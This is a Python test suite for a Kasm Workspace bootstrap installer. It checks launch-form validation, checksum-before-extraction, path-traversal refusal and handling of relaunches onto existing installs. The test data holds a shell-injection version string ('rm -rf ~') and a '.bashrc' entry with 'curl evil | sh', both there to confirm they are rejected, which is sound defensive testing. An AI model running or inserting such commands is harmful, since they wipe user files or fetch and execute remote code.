"""kasm_workspace/image/tubematic_bootstrap.py -- what the published Kasm
Workspace runs at launch to install the version picked on the launch form.

Every refusal here must download nothing: a guessed version, a second copy
beside an existing install, or an archive extracted before its checksum
matched are each worse than stopping with a message on screen. No test touches
the network; downloads go through a fake urlopen and clones through a fake run.
"""

import hashlib
import importlib.util
import io
import json
import os
import sys
import tarfile
import urllib.error
from types import SimpleNamespace

import pytest

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, REPO_ROOT)

from tubematic_core.version import GITHUB_REPO  # noqa: E402

_spec = importlib.util.spec_from_file_location(
    "tubematic_bootstrap", os.path.join(REPO_ROOT, "kasm_workspace", "image", "tubematic_bootstrap.py"))
bootstrap = importlib.util.module_from_spec(_spec)
sys.modules[_spec.name] = bootstrap
_spec.loader.exec_module(bootstrap)

BootstrapError = bootstrap.BootstrapError
Selection = bootstrap.Selection
Install = bootstrap.Install


def _selections(tmp_path, data):
    path = tmp_path / "selections.json"
    path.write_text(data if isinstance(data, str) else json.dumps(data))
    return path


def _tarball(version, files=None, extra=None):
    """A gzipped tarball shaped like build_release_tarball.py's output."""
    files = {"onboard.py": "print('onboard')\n", "VERSION": version + "\n"} if files is None else files
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        names = {f"tubematic-v{version}/{n}": c for n, c in files.items()}
        names.update(extra or {})
        for name, content in names.items():
            data = content.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


class FakeUrlopen:
    """Serves {url: bytes}; anything else is a 404. Records every URL asked for."""

    def __init__(self, responses):
        self.responses = responses
        self.calls = []

    def __call__(self, url, timeout=None):
        self.calls.append(url)
        if url not in self.responses:
            raise urllib.error.HTTPError(url, 404, "Not Found", {}, None)
        return io.BytesIO(self.responses[url])


def _release(version, tarball, checksum=None):
    name = f"tubematic-v{version}.tar.gz"
    digest = checksum or hashlib.sha256(tarball).hexdigest()
    return FakeUrlopen({
        bootstrap.release_url(version, "CHECKSUMS.txt"): f"{digest}  {name}\n".encode(),
        bootstrap.release_url(version, name): tarball,
    })


# ── The repo it downloads from ──────────────────────────────────────────────

def test_the_repo_matches_the_one_tubematic_core_names():
    """Duplicated because the image has no Tubematic source to import from."""
    assert bootstrap.GITHUB_REPO == GITHUB_REPO


def test_release_urls_are_the_documented_download_urls():
    assert bootstrap.release_url("2.0.0", "tubematic-v2.0.0.tar.gz") == (
        f"https://github.com/{GITHUB_REPO}/releases/download/v2.0.0/tubematic-v2.0.0.tar.gz")


# ── Reading the launch form ────────────────────────────────────────────────

def test_good_selections_are_read(tmp_path):
    path = _selections(tmp_path, {"tubematic_version": "2.0.0", "install_method": "Source"})
    assert bootstrap.read_selections(path) == Selection("2.0.0", "source")


@pytest.mark.parametrize("data", [
    "{not json",
    "[]",
    {"install_method": "release"},
    {"tubematic_version": "", "install_method": "release"},
    {"tubematic_version": "2.0", "install_method": "release"},
    {"tubematic_version": "v2.0.0", "install_method": "release"},
    {"tubematic_version": "2.0.0-rc1", "install_method": "release"},
    {"tubematic_version": "2.0.0; rm -rf ~", "install_method": "release"},
    {"tubematic_version": "2.0.0"},
    {"tubematic_version": "2.0.0", "install_method": "docker"},
], ids=["bad-json", "not-object", "no-version", "empty-version", "short-version", "v-prefix",
        "prerelease", "injection", "no-method", "unknown-method"])
def test_bad_selections_are_refused(tmp_path, data):
    with pytest.raises(BootstrapError):
        bootstrap.read_selections(_selections(tmp_path, data))


def test_missing_selections_are_refused(tmp_path):
    with pytest.raises(BootstrapError, match="launch form did not run"):
        bootstrap.read_selections(tmp_path / "absent.json")


@pytest.mark.parametrize("data", ["{not json", {"tubematic_version": "latest", "install_method": "release"}])
def test_a_bad_selection_downloads_nothing(tmp_path, monkeypatch, data):
    """End to end through main(): refused, exit 1, no request, nothing written."""
    home = tmp_path / "home"
    home.mkdir()
    fake = FakeUrlopen({})
    monkeypatch.setattr(bootstrap.urllib.request, "urlopen", fake)
    monkeypatch.setattr(bootstrap.subprocess, "run", lambda *a, **k: pytest.fail("ran a subprocess"))
    status = bootstrap.main([], home=home, selections_path=_selections(tmp_path, data))
    assert status == 1
    assert fake.calls == []
    assert {p.name for p in home.iterdir()} == {bootstrap.LOG_NAME}


# ── Finding an existing install ────────────────────────────────────────────

def test_an_empty_profile_has_no_install(tmp_path):
    assert bootstrap.existing_install(tmp_path) is None


def test_the_marker_names_the_install(tmp_path):
    bootstrap.write_marker(tmp_path, Selection("2.0.0", "release"), tmp_path / "tubematic-v2.0.0")
    assert bootstrap.existing_install(tmp_path) == Install(
        "2.0.0", "release", str(tmp_path / "tubematic-v2.0.0"))


@pytest.mark.parametrize("setup", ["data-dir", "corrupt-marker"])
def test_unknown_installs_are_detected_without_a_marker(tmp_path, setup):
    if setup == "data-dir":
        (tmp_path / ".tubematic-data").mkdir()
    else:
        (tmp_path / bootstrap.MARKER_NAME).write_text("{")
    assert bootstrap.existing_install(tmp_path) == Install(None, None, None)


# ── Deciding: the relaunch cases ───────────────────────────────────────────

def test_decide_installs_onto_an_empty_profile():
    assert bootstrap.decide(Selection("2.0.0", "release"), None)[0] == "install"


def test_decide_leaves_the_same_version_alone():
    action, message = bootstrap.decide(Selection("2.0.0", "release"), Install("2.0.0", "release", "/h/t"))
    assert action == "present"
    assert "onboard.py" in message


def test_decide_refuses_a_different_version_and_points_at_upgrade():
    """A relaunched persistent profile with a newer version picked: never a
    second copy beside it, never a replacement."""
    action, message = bootstrap.decide(Selection("2.1.0", "release"), Install("2.0.0", "release", "/h/t"))
    assert action == "refuse"
    assert "upgrade.py" in message and bootstrap.UPGRADE_GUIDE in message
    assert "Nothing was downloaded" in message


def test_decide_refuses_data_it_did_not_install():
    action, message = bootstrap.decide(Selection("2.0.0", "release"), Install(None, None, None))
    assert action == "refuse"
    assert "Nothing was downloaded" in message
    # The same refusal covers an unreadable marker with no data dir, so it
    # must not claim the data dir exists (it once did, found live).
    assert bootstrap.DATA_DIR_NAME in message and bootstrap.MARKER_NAME in message


def test_a_relaunch_with_a_newer_version_downloads_nothing(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    bootstrap.write_marker(home, Selection("2.0.0", "release"), home / "tubematic-v2.0.0")
    fake = FakeUrlopen({})
    monkeypatch.setattr(bootstrap.urllib.request, "urlopen", fake)
    path = _selections(tmp_path, {"tubematic_version": "2.1.0", "install_method": "release"})
    assert bootstrap.main([], home=home, selections_path=path) == 1
    assert fake.calls == []
    assert not (home / "tubematic-v2.1.0").exists()


# ── The release method ─────────────────────────────────────────────────────

def test_a_release_is_verified_then_extracted(tmp_path):
    fake = _release("2.0.0", _tarball("2.0.0"))
    target = bootstrap.fetch_release("2.0.0", tmp_path, urlopen=fake, say=lambda *_: None)
    assert target == tmp_path / "tubematic-v2.0.0"
    assert (target / "onboard.py").is_file()
    assert fake.calls[0].endswith("/CHECKSUMS.txt")


def test_a_checksum_mismatch_aborts_before_extraction(tmp_path):
    fake = _release("2.0.0", _tarball("2.0.0"), checksum="0" * 64)
    with pytest.raises(BootstrapError, match="Checksum mismatch"):
        bootstrap.fetch_release("2.0.0", tmp_path, urlopen=fake, say=lambda *_: None)
    assert not (tmp_path / "tubematic-v2.0.0").exists()
    assert not list((tmp_path / ".cache").rglob("*.tar.gz"))


def test_checksums_without_the_tarball_line_are_refused(tmp_path):
    name = "tubematic-v2.0.0.tar.gz"
    fake = FakeUrlopen({
        bootstrap.release_url("2.0.0", "CHECKSUMS.txt"): b"abc  something-else.tar.gz\n",
        bootstrap.release_url("2.0.0", name): _tarball("2.0.0"),
    })
    with pytest.raises(BootstrapError, match="no sha256"):
        bootstrap.fetch_release("2.0.0", tmp_path, urlopen=fake, say=lambda *_: None)
    assert not (tmp_path / "tubematic-v2.0.0").exists()


def test_an_unpublished_version_is_refused(tmp_path):
    with pytest.raises(BootstrapError, match="published release"):
        bootstrap.fetch_release("9.9.9", tmp_path, urlopen=FakeUrlopen({}), say=lambda *_: None)
    assert not (tmp_path / "tubematic-v9.9.9").exists()


def test_an_archive_with_paths_outside_its_directory_is_refused(tmp_path):
    tarball = _tarball("2.0.0", extra={".bashrc": "curl evil | sh\n"})
    with pytest.raises(BootstrapError, match="outside"):
        bootstrap.fetch_release("2.0.0", tmp_path, urlopen=_release("2.0.0", tarball), say=lambda *_: None)
    assert not (tmp_path / ".bashrc").exists()
    assert not (tmp_path / "tubematic-v2.0.0").exists()


def test_an_existing_target_directory_is_never_extracted_over(tmp_path):
    (tmp_path / "tubematic-v2.0.0").mkdir()
    fake = _release("2.0.0", _tarball("2.0.0"))
    with pytest.raises(BootstrapError, match="already exists"):
        bootstrap.fetch_release("2.0.0", tmp_path, urlopen=fake, say=lambda *_: None)
    assert fake.calls == []


def test_a_fresh_release_install_writes_the_marker_and_runs_onboarding(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(bootstrap.urllib.request, "urlopen", _release("2.0.0", _tarball("2.0.0")))
    ran = []
    monkeypatch.setattr(bootstrap.subprocess, "run",
                        lambda argv, cwd=None: ran.append((argv, cwd)) or SimpleNamespace(returncode=0))
    path = _selections(tmp_path, {"tubematic_version": "2.0.0", "install_method": "release"})
    assert bootstrap.main([], home=home, selections_path=path) == 0
    target = home / "tubematic-v2.0.0"
    assert ran == [([sys.executable, "onboard.py"], target)]
    assert bootstrap.existing_install(home) == Install("2.0.0", "release", str(target))


# ── The source method ──────────────────────────────────────────────────────

def test_source_clones_the_version_tag_not_the_default_branch(tmp_path):
    calls = []
    bootstrap.clone_source("2.0.0", tmp_path,
                           run=lambda argv: calls.append(argv) or SimpleNamespace(returncode=0),
                           say=lambda *_: None)
    [argv] = calls
    assert argv[:2] == ["git", "clone"]
    assert argv[argv.index("--branch") + 1] == "v2.0.0"
    assert argv[-2:] == [f"https://github.com/{GITHUB_REPO}.git", str(tmp_path / "tubematic-v2.0.0")]


def test_a_failed_clone_is_refused(tmp_path):
    with pytest.raises(BootstrapError, match="v9.9.9"):
        bootstrap.clone_source("9.9.9", tmp_path, run=lambda argv: SimpleNamespace(returncode=128),
                               say=lambda *_: None)


# ── tubematic-installer's helper ───────────────────────────────────────────

def test_install_dir_flag_prints_the_recorded_path(tmp_path, capsys):
    assert bootstrap.main(["--install-dir"], home=tmp_path) == 1
    bootstrap.write_marker(tmp_path, Selection("2.0.0", "source"), tmp_path / "tubematic-v2.0.0")
    assert bootstrap.main(["--install-dir"], home=tmp_path) == 0
    assert capsys.readouterr().out.strip() == str(tmp_path / "tubematic-v2.0.0")
